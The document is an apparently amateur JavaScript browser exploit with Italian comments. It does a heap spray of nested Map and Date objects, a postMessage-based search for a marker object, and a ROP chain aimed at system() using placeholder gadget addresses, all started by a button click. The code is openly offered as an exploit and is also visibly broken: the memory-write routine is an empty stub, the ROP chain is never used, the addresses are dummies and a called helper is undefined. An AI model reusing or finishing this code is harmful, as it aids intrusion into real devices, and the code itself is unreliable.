const gadgets = {
    "pop_rdi": 0x0000000000401234,  // Aggiungi qui l'indirizzo del gadget pop rdi
    "pop_rsi": 0x0000000000405678,  // Aggiungi qui l'indirizzo del gadget pop rsi
    "pop_rdx": 0x0000000000409abc,  // Aggiungi qui l'indirizzo del gadget pop rdx
    "ret": 0x000000000040abcd,     // Indirizzo della popolarizzazione di ritorno
    "system": 0x0000000000401111,  // Aggiungi l'indirizzo della funzione system()
    "exit": 0x0000000000402222     // Indirizzo di exit()
};

// Funzione di gestione della memoria (Garbage Collection)
function gc() {
    try {
        new Uint8Array(256 * 1024);  // Solo 256KB per evitare il crash
        alert('Garbage Collection eseguita');
    } catch (e) {
        alert("Errore durante Garbage Collection: " + e.message);
    }
}

// Funzione per creare una struttura di oggetti in Map per lo spray della memoria
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    // Riempire l'array foo con oggetti Date più piccoli
    for (let i = 0; i < 5; i++) {  // Ridurre ulteriormente il numero di oggetti
        foo.push(new Date(0xffff));  
    }

    // Creazione della struttura Map
    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    gc();  // Esegui GC per liberare memoria
    alert('Object structure creata');
    return root;
}

// Funzione per fare il test RW
function rwTest(address, value) {
    alert(`Test RW: Scrivo ${value} in ${address}`);
    // Implementazione del test RW che scrive direttamente su un indirizzo di memoria
    // Questo codice dovrebbe scrivere in una zona di memoria vulnerabile
    // Aggiungi logica per scrivere direttamente nella memoria in base al tuo exploit
}

// Funzione per costruire una ROP chain
function ropChain() {
    const chain = [];

    // Aggiungi i gadget per la ROP chain
    chain.push(gadgets.pop_rdi);  // Pop RDI
    chain.push(gadgets.pop_rsi);  // Pop RSI
    chain.push(gadgets.pop_rdx);  // Pop RDX
    chain.push(gadgets.ret);      // Ret

    // Aggiungi le funzioni che vuoi chiamare con ROP
    chain.push(gadgets.system);   // Chiamata alla funzione system
    chain.push(gadgets.exit);     // Chiamata alla funzione exit

    return chain;
}

// Funzione principale che gestisce l'exploit
export async function main() {
    alert("Exploit iniziato");

    const num_elems = 5;  // Riduci ulteriormente il numero di oggetti per evitare crash
    let root = createObjectStructure(num_elems);  // Crea la struttura di oggetti
    let msg = root;
    let data2 = null;
    let idx = null;

    alert("Oggetto struttura creata");

    let found = false;
    let retryCount = 0;  // Aggiungi un contatore per evitare un ciclo infinito
    let messageReceived = false;  // Flag per tracciare se il messaggio è stato ricevuto

    while (!found && retryCount < 3) {  // Limitiamo il numero di tentativi
        retryCount++;
        let data = null;

        // Aggiungi un evento di ascolto per il messaggio
        const prom = new Promise((resolve, reject) => {
            addEventListener('message', event => {
                if (messageReceived) {
                    alert("Messaggio già ricevuto, ignorato.");
                    return;
                }
                messageReceived = true;
                data = event;
                alert("Messaggio ricevuto: " + JSON.stringify(data));
                resolve();
            }, { once: true });

            // Timeout per il caso in cui il messaggio non arrivi mai
            setTimeout(() => {
                reject("Timeout raggiunto, messaggio non ricevuto");
            }, 5000);  // 5 secondi di timeout
        });

        alert("Postando messaggio...");
        try {
            postMessage(msg);  // Pubblica il messaggio
            await prom;  // Aspetta che venga ricevuto il messaggio
            alert("Messaggio ricevuto con successo!");  // Aggiungi alert per confermare che è arrivato
        } catch (e) {
            alert("Errore durante il postMessage o timeout: " + e.message);
            break;
        }

        if (!data) {
            alert("Nessun dato ricevuto!");
            break;
        }

        data = data.data;

        gc();  // Esegui garbage collection per liberare memoria

        await sleep(100);  // Attendi per evitare sovraccarichi di memoria

        let i;
        try {
            // Ciclo per cercare l'indice
            alert("Inizio ricerca dell'indice...");
            for (i = 0; i < num_elems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    found = true;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch (e) {
            alert("Errore durante l'elaborazione del messaggio: " + e.message);
            break;
        }
    }

    if (found) {
        alert('Exploit attivato, prova a fare crash');
        alert('[+] idx: ' + idx);

        // Esegui la ROP chain e il test RW
        let rop = ropChain();
        rwTest(0xdeadbeef, 0x1337);  // Test RW con indirizzo fittizio
        alert("ROP chain e test RW completati");
    } else {
        alert("Tentativi di exploit esauriti o falliti.");
    }
}

// Aggiungi evento per avviare l'exploit al click del pulsante
document.getElementById('button').addEventListener('click', async () => {
    await main();
});
